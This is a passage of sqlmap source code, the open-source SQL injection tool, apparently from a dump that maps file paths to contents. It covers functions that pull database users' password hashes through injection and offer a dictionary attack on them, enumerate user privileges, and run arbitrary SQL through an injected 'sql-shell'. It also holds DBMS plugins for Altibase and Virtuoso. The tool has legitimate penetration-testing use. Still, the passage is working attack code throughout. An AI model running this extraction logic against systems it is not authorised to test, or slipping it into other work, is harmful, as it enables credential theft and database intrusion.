logger.info(infoMsg)\n\n        if conf.user and Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):\n            conf.user = conf.user.upper()\n\n        if conf.user:\n            users = conf.user.split(',')\n\n            if Backend.isDbms(DBMS.MYSQL):\n                for user in users:\n                    parsedUser = re.search(r\"['\\\"]?(.*?)['\\\"]?\\@\", user)\n\n                    if parsedUser:\n                        users[users.index(user)] = parsedUser.groups()[0]\n        else:\n            users = []\n\n        users = [_ for _ in users if _]\n\n        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n            if Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin((\"2005\", \"2008\")):\n                query = rootQuery.inband.query2\n            else:\n                query = rootQuery.inband.query\n\n            condition = rootQuery.inband.condition\n\n            if conf.user:\n                query += \" WHERE \"\n                query += \" OR \".join(\"%s = '%s'\" % (condition, user) for user in sorted(users))\n\n            if Backend.isDbms(DBMS.SYBASE):\n                getCurrentThreadData().disableStdOut = True\n\n                retVal = pivotDumpTable(\"(%s) AS %s\" % (query, kb.aliasName), ['%s.name' % kb.aliasName, '%s.password' % kb.aliasName], blind=False)\n\n                if retVal:\n                    for user, password in filterPairValues(_zip(retVal[0][\"%s.name\" % kb.aliasName], retVal[0][\"%s.password\" % kb.aliasName])):\n                        if user not in kb.data.cachedUsersPasswords:\n                            kb.data.cachedUsersPasswords[user] = [password]\n                        else:\n                            kb.data.cachedUsersPasswords[user].append(password)\n\n                getCurrentThreadData().disableStdOut = False\n            else:\n                values = inject.getValue(query, blind=False, time=False)\n\n                if Backend.isDbms(DBMS.MSSQL) and isNoneValue(values):\n                    values = inject.getValue(query.replace(\"master.dbo.fn_varbintohexstr\", \"sys.fn_sqlvarbasetostr\"), blind=False, time=False)\n                elif Backend.isDbms(DBMS.MYSQL) and (isNoneValue(values) or all(len(value) == 2 and (isNullValue(value[1]) or isNoneValue(value[1])) for value in values)):\n                    values = inject.getValue(query.replace(\"authentication_string\", \"password\"), blind=False, time=False)\n\n                for user, password in filterPairValues(values):\n                    if not user or user == \" \":\n                        continue\n\n                    password = parsePasswordHash(password)\n\n                    if user not in kb.data.cachedUsersPasswords:\n                        kb.data.cachedUsersPasswords[user] = [password]\n                    else:\n                        kb.data.cachedUsersPasswords[user].append(password)\n\n        if not kb.data.cachedUsersPasswords and isInferenceAvailable() and not conf.direct:\n            fallback = False\n\n            if not len(users):\n                users = self.getUsers()\n\n                if Backend.isDbms(DBMS.MYSQL):\n                    for user in users:\n                        parsedUser = re.search(r\"['\\\"]?(.*?)['\\\"]?\\@\", user)\n\n                        if parsedUser:\n                            users[users.index(user)] = parsedUser.groups()[0]\n\n            if Backend.isDbms(DBMS.SYBASE):\n                getCurrentThreadData().disableStdOut = True\n\n                query = rootQuery.inband.query\n\n                retVal = pivotDumpTable(\"(%s) AS %s\" % (query, kb.aliasName), ['%s.name' % kb.aliasName, '%s.password' % kb.aliasName], blind=True)\n\n                if retVal:\n                    for user, password in filterPairValues(_zip(retVal[0][\"%s.name\" % kb.aliasName], retVal[0][\"%s.password\" % kb.aliasName])):\n                        password = \"0x%s\" % encodeHex(password, binary=False).upper()\n\n                        if user not in kb.data.cachedUsersPasswords:\n                            kb.data.cachedUsersPasswords[user] = [password]\n                        else:\n                            kb.data.cachedUsersPasswords[user].append(password)\n\n                getCurrentThreadData().disableStdOut = False\n            else:\n                retrievedUsers = set()\n\n                for user in users:\n                    user = unArrayizeValue(user)\n\n                    if user in retrievedUsers:\n                        continue\n\n                    if Backend.getIdentifiedDbms() in (DBMS.INFORMIX, DBMS.VIRTUOSO):\n                        count = 1\n                    else:\n                        infoMsg = \"fetching number of password hashes \"\n                        infoMsg += \"for user '%s'\" % user\n                        logger.info(infoMsg)\n\n                        if Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin((\"2005\", \"2008\")):\n                            query = rootQuery.blind.count2 % user\n                        else:\n                            query = rootQuery.blind.count % user\n\n                        count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n                        if not isNumPosStrValue(count):\n                            if Backend.isDbms(DBMS.MSSQL):\n                                fallback = True\n                                count = inject.getValue(query.replace(\"master.dbo.fn_varbintohexstr\", \"sys.fn_sqlvarbasetostr\"), union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n                            elif Backend.isDbms(DBMS.MYSQL):\n                                fallback = True\n                                count = inject.getValue(query.replace(\"authentication_string\", \"password\"), union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n                        if not isNumPosStrValue(count):\n                            warnMsg = \"unable to retrieve the number of password \"\n                            warnMsg += \"hashes for user '%s'\" % user\n                            logger.warning(warnMsg)\n                            continue\n\n                    infoMsg = \"fetching password hashes for user '%s'\" % user\n                    logger.info(infoMsg)\n\n                    passwords = []\n\n                    plusOne = Backend.getIdentifiedDbms() in PLUS_ONE_DBMSES\n                    indexRange = getLimitRange(count, plusOne=plusOne)\n\n                    for index in indexRange:\n                        if Backend.isDbms(DBMS.MSSQL):\n                            if Backend.isVersionWithin((\"2005\", \"2008\")):\n                                query = rootQuery.blind.query2 % (user, index, user)\n                            else:\n                                query = rootQuery.blind.query % (user, index, user)\n\n                            if fallback:\n                                query = query.replace(\"master.dbo.fn_varbintohexstr\", \"sys.fn_sqlvarbasetostr\")\n\n                        elif Backend.getIdentifiedDbms() in (DBMS.INFORMIX, DBMS.VIRTUOSO):\n                            query = rootQuery.blind.query % (user,)\n\n                        elif Backend.isDbms(DBMS.HSQLDB):\n                            query = rootQuery.blind.query % (index, user)\n\n                        else:\n                            query = rootQuery.blind.query % (user, index)\n\n                        if Backend.isDbms(DBMS.MYSQL):\n                            if fallback:\n                                query = query.replace(\"authentication_string\", \"password\")\n\n                        password = unArrayizeValue(inject.getValue(query, union=False, error=False))\n                        password = parsePasswordHash(password)\n\n                        passwords.append(password)\n\n                    if passwords:\n                        kb.data.cachedUsersPasswords[user] = passwords\n                    else:\n                        warnMsg = \"unable to retrieve the password \"\n                        warnMsg += \"hashes for user '%s'\" % user\n                        logger.warning(warnMsg)\n\n                    retrievedUsers.add(user)\n\n        if not kb.data.cachedUsersPasswords:\n            errMsg = \"unable to retrieve the password hashes for the \"\n            errMsg += \"database users\"\n            logger.error(errMsg)\n        else:\n            for user in kb.data.cachedUsersPasswords:\n                kb.data.cachedUsersPasswords[user] = list(set(kb.data.cachedUsersPasswords[user]))\n\n            storeHashesToFile(kb.data.cachedUsersPasswords)\n\n            message = \"do you want to perform a dictionary-based attack \"\n            message += \"against retrieved password hashes? [Y/n/q]\"\n            choice = readInput(message, default='Y').upper()\n\n            if choice == 'N':\n                pass\n            elif choice == 'Q':\n                raise SqlmapUserQuitException\n            else:\n                attackCachedUsersPasswords()\n\n        return kb.data.cachedUsersPasswords\n\n    def getPrivileges(self, query2=False):\n        infoMsg = \"fetching database users privileges\"\n\n        rootQuery = queries[Backend.getIdentifiedDbms()].privileges\n\n        if conf.user == CURRENT_USER:\n            infoMsg += \" for current user\"\n            conf.user = self.getCurrentUser()\n\n        logger.info(infoMsg)\n\n        if conf.user and Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):\n            conf.user = conf.user.upper()\n\n        if conf.user:\n            users = conf.user.split(',')\n\n            if Backend.isDbms(DBMS.MYSQL):\n                for user in users:\n                    parsedUser = re.search(r\"['\\\"]?(.*?)['\\\"]?\\@\", user)\n\n                    if parsedUser:\n                        users[users.index(user)] = parsedUser.groups()[0]\n        else:\n            users = []\n\n        users = [_ for _ in users if _]\n\n        # Set containing the list of DBMS administrators\n        areAdmins = set()\n\n        if not kb.data.cachedUsersPrivileges and any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n            if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:\n                query = rootQuery.inband.query2\n                condition = rootQuery.inband.condition2\n            elif Backend.isDbms(DBMS.ORACLE) and query2:\n                query = rootQuery.inband.query2\n                condition = rootQuery.inband.condition2\n            else:\n                query = rootQuery.inband.query\n                condition = rootQuery.inband.condition\n\n            if conf.user:\n                query += \" WHERE \"\n\n                if Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:\n                    query += \" OR \".join(\"%s LIKE '%%%s%%'\" % (condition, user) for user in sorted(users))\n                else:\n                    query += \" OR \".join(\"%s = '%s'\" % (condition, user) for user in sorted(users))\n\n            values = inject.getValue(query, blind=False, time=False)\n\n            if not values and Backend.isDbms(DBMS.ORACLE) and not query2:\n                infoMsg = \"trying with table 'USER_SYS_PRIVS'\"\n                logger.info(infoMsg)\n\n                return self.getPrivileges(query2=True)\n\n            if not isNoneValue(values):\n                for value in values:\n                    user = None\n                    privileges = set()\n\n                    for count in xrange(0, len(value or [])):\n                        # The first column is always the username\n                        if count == 0:\n                            user = value[count]\n\n                        # The other columns are the privileges\n                        else:\n                            privilege = value[count]\n\n                            if privilege is None:\n                                continue\n\n                            # In PostgreSQL we get 1 if the privilege is\n                            # True, 0 otherwise\n                            if Backend.isDbms(DBMS.PGSQL) and getUnicode(privilege).isdigit():\n                                if int(privilege) == 1 and count in PGSQL_PRIVS:\n                                    privileges.add(PGSQL_PRIVS[count])\n\n                            # In MySQL >= 5.0 and Oracle we get the list\n                            # of privileges as string\n                            elif Backend.isDbms(DBMS.ORACLE) or (Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema) or Backend.getIdentifiedDbms() in (DBMS.VERTICA, DBMS.MIMERSQL, DBMS.CUBRID):\n                                privileges.add(privilege)\n\n                            # In MySQL < 5.0 we get Y if the privilege is\n                            # True, N otherwise\n                            elif Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:\n                                if privilege.upper() == 'Y':\n                                    privileges.add(MYSQL_PRIVS[count])\n\n                            # In Firebird we get one letter for each privilege\n                            elif Backend.isDbms(DBMS.FIREBIRD):\n                                if privilege.strip() in FIREBIRD_PRIVS:\n                                    privileges.add(FIREBIRD_PRIVS[privilege.strip()])\n\n                            # In DB2 we get Y or G if the privilege is\n                            # True, N otherwise\n                            elif Backend.isDbms(DBMS.DB2):\n                                privs = privilege.split(',')\n                                privilege = privs[0]\n                                if len(privs) > 1:\n                                    privs = privs[1]\n                                    privs = list(privs.strip())\n                                    i = 1\n\n                                    for priv in privs:\n                                        if priv.upper() in ('Y', 'G'):\n                                            for position, db2Priv in DB2_PRIVS.items():\n                                                if position == i:\n                                                    privilege += \", \" + db2Priv\n\n                                        i += 1\n\n                                privileges.add(privilege)\n\n                    if user in kb.data.cachedUsersPrivileges:\n                        kb.data.cachedUsersPrivileges[user] = list(privileges.union(kb.data.cachedUsersPrivileges[user]))\n                    else:\n                        kb.data.cachedUsersPrivileges[user] = list(privileges)\n\n        if not kb.data.cachedUsersPrivileges and isInferenceAvailable() and not conf.direct:\n            if Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:\n                conditionChar = \"LIKE\"\n            else:\n                conditionChar = \"=\"\n\n            if not len(users):\n                users = self.getUsers()\n\n                if Backend.isDbms(DBMS.MYSQL):\n                    for user in users:\n                        parsedUser = re.search(r\"['\\\"]?(.*?)['\\\"]?\\@\", user)\n\n                        if parsedUser:\n                            users[users.index(user)] = parsedUser.groups()[0]\n\n            retrievedUsers = set()\n\n            for user in users:\n                outuser = user\n                if user in retrievedUsers:\n                    continue\n\n                if Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:\n                    user = \"%%%s%%\" % user\n\n                if Backend.isDbms(DBMS.INFORMIX):\n                    count = 1\n                else:\n                    infoMsg = \"fetching number of privileges \"\n                    infoMsg += \"for user '%s'\" % outuser\n                    logger.info(infoMsg)\n\n                    if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:\n                        query = rootQuery.blind.count2 % user\n                    elif Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:\n                        query = rootQuery.blind.count % (conditionChar, user)\n                    elif Backend.isDbms(DBMS.ORACLE) and query2:\n                        query = rootQuery.blind.count2 % user\n                    else:\n                        query = rootQuery.blind.count % user\n\n                    count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n                    if not isNumPosStrValue(count):\n                        if not retrievedUsers and Backend.isDbms(DBMS.ORACLE) and not query2:\n                            infoMsg = \"trying with table 'USER_SYS_PRIVS'\"\n                            logger.info(infoMsg)\n\n                            return self.getPrivileges(query2=True)\n\n                        warnMsg = \"unable to retrieve the number of \"\n                        warnMsg += \"privileges for user '%s'\" % outuser\n                        logger.warning(warnMsg)\n                        continue\n\n                infoMsg = \"fetching privileges for user '%s'\" % outuser\n                logger.info(infoMsg)\n\n                privileges = set()\n\n                plusOne = Backend.getIdentifiedDbms() in PLUS_ONE_DBMSES\n                indexRange = getLimitRange(count, plusOne=plusOne)\n\n                for index in indexRange:\n                    if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:\n                        query = rootQuery.blind.query2 % (user, index)\n                    elif Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema:\n                        query = rootQuery.blind.query % (conditionChar, user, index)\n                    elif Backend.isDbms(DBMS.ORACLE) and query2:\n                        query = rootQuery.blind.query2 % (user, index)\n                    elif Backend.isDbms(DBMS.FIREBIRD):\n                        query = rootQuery.blind.query % (index, user)\n                    elif Backend.isDbms(DBMS.INFORMIX):\n                        query = rootQuery.blind.query % (user,)\n                    else:\n                        query = rootQuery.blind.query % (user, index)\n\n                    privilege = unArrayizeValue(inject.getValue(query, union=False, error=False))\n\n                    if privilege is None:\n                        continue\n\n                    # In PostgreSQL we get 1 if the privilege is True,\n                    # 0 otherwise\n                    if Backend.isDbms(DBMS.PGSQL) and \", \" in privilege:\n                        privilege = privilege.replace(\", \", ',')\n                        privs = privilege.split(',')\n                        i = 1\n\n                        for priv in privs:\n                            if priv.isdigit() and int(priv) == 1 and i in PGSQL_PRIVS:\n                                privileges.add(PGSQL_PRIVS[i])\n\n                            i += 1\n\n                    # In MySQL >= 5.0 and Oracle we get the list\n                    # of privileges as string\n                    elif Backend.isDbms(DBMS.ORACLE) or (Backend.isDbms(DBMS.MYSQL) and kb.data.has_information_schema) or Backend.getIdentifiedDbms() in (DBMS.VERTICA, DBMS.MIMERSQL, DBMS.CUBRID):\n                        privileges.add(privilege)\n\n                    # In MySQL < 5.0 we get Y if the privilege is\n                    # True, N otherwise\n                    elif Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:\n                        privilege = privilege.replace(\", \", ',')\n                        privs = privilege.split(',')\n                        i = 1\n\n                        for priv in privs:\n                            if priv.upper() == 'Y':\n                                for position, mysqlPriv in MYSQL_PRIVS.items():\n                                    if position == i:\n                                        privileges.add(mysqlPriv)\n\n                            i += 1\n\n                    # In Firebird we get one letter for each privilege\n                    elif Backend.isDbms(DBMS.FIREBIRD):\n                        if privilege.strip() in FIREBIRD_PRIVS:\n                            privileges.add(FIREBIRD_PRIVS[privilege.strip()])\n\n                    # In Informix we get one letter for the highest privilege\n                    elif Backend.isDbms(DBMS.INFORMIX):\n                        if privilege.strip() in INFORMIX_PRIVS:\n                            privileges.add(INFORMIX_PRIVS[privilege.strip()])\n\n                    # In DB2 we get Y or G if the privilege is\n                    # True, N otherwise\n                    elif Backend.isDbms(DBMS.DB2):\n                        privs = privilege.split(',')\n                        privilege = privs[0]\n                        privs = privs[1]\n                        privs = list(privs.strip())\n                        i = 1\n\n                        for priv in privs:\n                            if priv.upper() in ('Y', 'G'):\n                                for position, db2Priv in DB2_PRIVS.items():\n                                    if position == i:\n                                        privilege += \", \" + db2Priv\n\n                            i += 1\n\n                        privileges.add(privilege)\n\n                    # In MySQL < 5.0 we break the cycle after the first\n                    # time we get the user's privileges otherwise we\n                    # duplicate the same query\n                    if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:\n                        break\n\n                if privileges:\n                    kb.data.cachedUsersPrivileges[user] = list(privileges)\n                else:\n                    warnMsg = \"unable to retrieve the privileges \"\n                    warnMsg += \"for user '%s'\" % outuser\n                    logger.warning(warnMsg)\n\n                retrievedUsers.add(user)\n\n        if not kb.data.cachedUsersPrivileges:\n            errMsg = \"unable to retrieve the privileges \"\n            errMsg += \"for the database users\"\n            raise SqlmapNoneDataException(errMsg)\n\n        for user, privileges in kb.data.cachedUsersPrivileges.items():\n            if isAdminFromPrivileges(privileges):\n                areAdmins.add(user)\n\n        return (kb.data.cachedUsersPrivileges, areAdmins)\n\n    def getRoles(self, query2=False):\n        warnMsg = \"on %s the concept of roles does not \" % Backend.getIdentifiedDbms()\n        warnMsg += \"exist. sqlmap will enumerate privileges instead\"\n        logger.warning(warnMsg)\n\n        return self.getPrivileges(query2)\n", "plugins/generic/custom.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport re\nimport sys\n\nfrom lib.core.common import Backend\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import getSQLSnippet\nfrom lib.core.common import isStackingAvailable\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.dicts import SQL_STATEMENTS\nfrom lib.core.enums import AUTOCOMPLETE_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.settings import METADB_SUFFIX\nfrom lib.core.settings import NULL\nfrom lib.core.settings import PARAMETER_SPLITTING_REGEX\nfrom lib.core.shell import autoCompletion\nfrom lib.request import inject\nfrom thirdparty.six.moves import input as _input\n\nclass Custom(object):\n    \"\"\"\n    This class defines custom enumeration functionalities for plugins.\n    \"\"\"\n\n    def __init__(self):\n        pass\n\n    def sqlQuery(self, query):\n        output = None\n        sqlType = None\n        query = query.rstrip(';')\n\n        try:\n            for sqlTitle, sqlStatements in SQL_STATEMENTS.items():\n                for sqlStatement in sqlStatements:\n                    if query.lower().startswith(sqlStatement):\n                        sqlType = sqlTitle\n                        break\n\n            if not re.search(r\"\\b(OPENROWSET|INTO)\\b\", query, re.I) and (not sqlType or \"SELECT\" in sqlType):\n                infoMsg = \"fetching %s query output: '%s'\" % (sqlType if sqlType is not None else \"SQL\", query)\n                logger.info(infoMsg)\n\n                if Backend.isDbms(DBMS.MSSQL):\n                    match = re.search(r\"(\\bFROM\\s+)([^\\s]+)\", query, re.I)\n                    if match and match.group(2).count('.') == 1:\n                        query = query.replace(match.group(0), \"%s%s\" % (match.group(1), match.group(2).replace('.', \".dbo.\")))\n\n                query = re.sub(r\"(?i)\\w+%s\\.?\" % METADB_SUFFIX, \"\", query)\n\n                output = inject.getValue(query, fromUser=True)\n\n                return output\n            elif not isStackingAvailable() and not conf.direct:\n                warnMsg = \"execution of non-query SQL statements is only \"\n                warnMsg += \"available when stacked queries are supported\"\n                logger.warning(warnMsg)\n\n                return None\n            else:\n                if sqlType:\n                    infoMsg = \"executing %s statement: '%s'\" % (sqlType if sqlType is not None else \"SQL\", query)\n                else:\n                    infoMsg = \"executing unknown SQL command: '%s'\" % query\n                logger.info(infoMsg)\n\n                inject.goStacked(query)\n\n                output = NULL\n\n        except SqlmapNoneDataException as ex:\n            logger.warning(ex)\n\n        return output\n\n    def sqlShell(self):\n        infoMsg = \"calling %s shell. To quit type \" % Backend.getIdentifiedDbms()\n        infoMsg += \"'x' or 'q' and press ENTER\"\n        logger.info(infoMsg)\n\n        autoCompletion(AUTOCOMPLETE_TYPE.SQL)\n\n        while True:\n            query = None\n\n            try:\n                query = _input(\"sql-shell> \")\n                query = getUnicode(query, encoding=sys.stdin.encoding)\n                query = query.strip(\"; \")\n            except UnicodeDecodeError:\n                print()\n                errMsg = \"invalid user input\"\n                logger.error(errMsg)\n            except KeyboardInterrupt:\n                print()\n                errMsg = \"user aborted\"\n                logger.error(errMsg)\n            except EOFError:\n                print()\n                errMsg = \"exit\"\n                logger.error(errMsg)\n                break\n\n            if not query:\n                continue\n\n            if query.lower() in (\"x\", \"q\", \"exit\", \"quit\"):\n                break\n\n            output = self.sqlQuery(query)\n\n            if output and output != \"Quit\":\n                conf.dumper.sqlQuery(query, output)\n\n            elif not output:\n                pass\n\n            elif output != \"Quit\":\n                dataToStdout(\"No output\\n\")\n\n    def sqlFile(self):\n        infoMsg = \"executing SQL statements from given file(s)\"\n        logger.info(infoMsg)\n\n        for filename in re.split(PARAMETER_SPLITTING_REGEX, conf.sqlFile):\n            filename = filename.strip()\n\n            if not filename:\n                continue\n\n            snippet = getSQLSnippet(Backend.getDbms(), filename)\n\n            if snippet and all(query.strip().upper().startswith(\"SELECT\") for query in (_ for _ in snippet.split(';' if ';' in snippet else '\\n') if _)):\n                for query in (_ for _ in snippet.split(';' if ';' in snippet else '\\n') if _):\n                    query = query.strip()\n                    if query:\n                        conf.dumper.sqlQuery(query, self.sqlQuery(query))\n            else:\n                conf.dumper.sqlQuery(snippet, self.sqlQuery(snippet))\n", "plugins/dbms/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "plugins/dbms/altibase/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getStatements(self):\n        warnMsg = \"on Altibase it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getHostname(self):\n        warnMsg = \"on Altibase it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n", "plugins/dbms/altibase/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on Altibase it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/altibase/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"CHR(%d)\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/altibase/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import ALTIBASE_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.ALTIBASE)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.ALTIBASE\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(ALTIBASE_ALIASES):\n            setDbms(DBMS.ALTIBASE)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.ALTIBASE\n        logger.info(infoMsg)\n\n        # Reference: http://support.altibase.com/fileDownload.do?gubun=admin&no=228\n        result = inject.checkBooleanExpression(\"CHOSUNG(NULL) IS NULL\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.ALTIBASE\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"TDESENCRYPT(NULL,NULL) IS NULL\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.ALTIBASE\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.ALTIBASE)\n\n            self.getBanner()\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.ALTIBASE\n            logger.warning(warnMsg)\n\n            return False\n", "plugins/dbms/altibase/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Altibase it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on Altibase it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on Altibase it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on Altibase it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/altibase/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    pass\n", "plugins/dbms/altibase/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import ALTIBASE_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\n\nfrom plugins.dbms.altibase.enumeration import Enumeration\nfrom plugins.dbms.altibase.filesystem import Filesystem\nfrom plugins.dbms.altibase.fingerprint import Fingerprint\nfrom plugins.dbms.altibase.syntax import Syntax\nfrom plugins.dbms.altibase.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass AltibaseMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Altibase methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = ALTIBASE_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.ALTIBASE] = Syntax.escape\n", "plugins/dbms/virtuoso/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getPasswordHashes(self):\n        warnMsg = \"on Virtuoso it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on Virtuoso it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getRoles(self, *args, **kwargs):\n        warnMsg = \"on Virtuoso it is not possible to enumerate the user roles\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def searchDb(self):\n        warnMsg = \"on Virtuoso it is not possible to search databases\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchTable(self):\n        warnMsg = \"on Virtuoso it is not possible to search tables\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchColumn(self):\n        warnMsg = \"on Virtuoso it is not possible to search columns\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def search(self):\n        warnMsg = \"on Virtuoso search option is not available\"\n        logger.warning(warnMsg)\n\n    def getStatements(self):\n        warnMsg = \"on Virtuoso it is not possible to enumerate the 